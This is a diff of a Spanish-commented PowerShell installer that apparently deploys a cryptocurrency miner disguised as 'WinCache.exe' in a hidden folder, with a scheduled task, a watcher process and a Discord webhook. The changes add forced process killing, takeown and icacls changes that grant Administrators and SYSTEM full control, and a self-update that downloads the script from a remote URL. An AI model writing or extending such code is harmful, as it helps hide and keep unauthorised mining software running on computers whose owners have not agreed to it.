@@ -53,22 +53,30 @@ function Send-DiscordWebhook {
 }
 
 function Stop-Safe {
-    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
+    Write-Host '[*] Deteniendo procesos anteriores...'
+    # Matar el minero a la fuerza (por si es propiedad de SYSTEM)
+    & taskkill.exe /F /IM WinCache.exe /T 2>&1 | Out-Null
+    
+    # Matar el Watcher de PowerShell
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
     foreach ($w in $watchers) {
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+        & taskkill.exe /F /PID $w.ProcessId /T 2>&1 | Out-Null
     }
-    Start-Sleep -Seconds 1
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
 }
 
 function Force-Unlock {
     param([string]$Path)
     if (Test-Path $Path) {
         try {
+            # Quitar atributo de oculto para que takeown funcione sin problemas
+            & attrib.exe -h -s "$Path\*.*" /s /d 2>&1 | Out-Null
+            & attrib.exe -h -s $Path /d 2>&1 | Out-Null
+            
             $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
             & takeown.exe /f $Path /r /d $confirm 2>&1 | Out-Null
+            
             & icacls.exe $Path /reset /T /C 2>&1 | Out-Null
             & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)F" /T /C 2>&1 | Out-Null
             & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T /C 2>&1 | Out-Null
@@ -113,7 +121,6 @@ if ($Diagnose) {
     $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if (-not $isAdmin) {
         Write-Host "`n[!] NOTA: Ejecutando sin privilegios de Administrador." -ForegroundColor Yellow
-        Write-Host "    Algunas acciones (como forzar el inicio) pueden fallar." -ForegroundColor Yellow
     }
 
     Write-Host "`n[+] 1. Verificando Tarea Programada..." -ForegroundColor Cyan
@@ -134,8 +141,6 @@ if ($Diagnose) {
                 } catch {
                     Write-Host "    [X] Error al iniciar la tarea: $_" -ForegroundColor Red
                 }
-            } else {
-                Write-Host "    [!] Se requieren permisos de Admin para forzar el inicio." -ForegroundColor Red
             }
         }
     } else { 
@@ -159,13 +164,13 @@ if ($Diagnose) {
             if ($timeDiff.TotalMinutes -lt 2) {
                 Write-Host "    [OK] El Watcher ESTÁ VIVO (escribió en el log hace $([math]::Round($timeDiff.TotalSeconds)) segundos)." -ForegroundColor Green
             } else {
-                Write-Host "    [!] El log no se actualiza hace $([math]::Round($timeDiff.TotalMinutes)) minutos. El Watcher podría estar colgado." -ForegroundColor Yellow
+                Write-Host "    [!] El log no se actualiza hace $([math]::Round($timeDiff.TotalMinutes)) minutos." -ForegroundColor Yellow
             }
         } else {
-            Write-Host "    [!] El archivo de log no existe o no tienes permiso para verlo." -ForegroundColor Red
+            Write-Host "    [!] El archivo de log no existe o no tienes permiso." -ForegroundColor Red
         }
     } catch {
-        Write-Host "    [!] Acceso denegado al log (requiere admin para leer la carpeta oculta)." -ForegroundColor Yellow
+        Write-Host "    [!] Acceso denegado al log." -ForegroundColor Yellow
     }
 
     Write-Host "`n[+] 4. Últimas líneas del Log..." -ForegroundColor Cyan
@@ -174,7 +179,7 @@ if ($Diagnose) {
             Get-Content $LogFile -Tail 10 -ErrorAction Stop | ForEach-Object { Write-Host "    $_" } 
         } 
     } catch {
-        Write-Host "    [!] No se pudo leer el log por permisos." -ForegroundColor Red
+        Write-Host "    [!] No se pudo leer el log." -ForegroundColor Red
     }
 
     Write-Host "`n=================================================="
@@ -201,10 +206,14 @@ if (-not $Run -and -not $NoElevate -and -not $Diagnose) {
 
 # ---------- PREPARACIÓN (POST-ELEVACIÓN) ------------------------------------
 if (-not $Run) {
-    # 1. Detener instancia anterior (libera bloqueos de archivo)
+    # 1. Desregistrar tarea para que no reinicie el proceso durante la actualización
+    Write-Host '[*] Desregistrando tarea anterior...'
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+
+    # 2. Detener procesos forzosamente
     Stop-Safe
     
-    # 2. Asegurar permisos
+    # 3. Asegurar permisos (quitar bloqueo)
     Write-Host '[*] Asegurando permisos de la carpeta...'
     Force-Unlock -Path $Root
 }
@@ -228,7 +237,6 @@ try {
 
 # 2. DESINSTALACIÓN
 if ($Uninstall) {
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
     Write-Host '[+] Desinstalado correctamente.'
     return
 }
@@ -334,19 +342,25 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
     $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
 }
 
-# 6. ACTUALIZACIÓN DEL SCRIPT
-Write-Host '[*] Actualizando copia local del script...'
-if (Test-Path $SelfPs) {
-    Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
-}
+# 6. ACTUALIZACIÓN DEL SCRIPT (TÉCNICA DEL ARCHIVO TEMPORAL)
+Write-Host '[*] Guardando nueva versión del script...'
+$TempPs = Join-Path $env:TEMP 'WinCache_update.ps1'
 
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
-    Copy-Item $scriptPath $SelfPs -Force
-    Unblock-File $SelfPs -ErrorAction SilentlyContinue
-} elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
-    Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
-    Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
+    Copy-Item $scriptPath $TempPs -Force
+} else {
+    Write-Host '[*] Ejecución en memoria detectada. Descargando copia local...'
+    Invoke-WebRequest -Uri $RemoteUrl -OutFile $TempPs -UseBasicParsing
 }
+
+# Eliminar forzosamente el archivo viejo y mover el nuevo
+if (Test-Path $SelfPs) {
+    & icacls.exe $SelfPs /grant "*S-1-5-32-544:F" 2>&1 | Out-Null
+    Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
+}
+Copy-Item $TempPs $SelfPs -Force
+Remove-Item $TempPs -Force -ErrorAction SilentlyContinue
+Unblock-File $SelfPs -ErrorAction SilentlyContinue
 
 $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
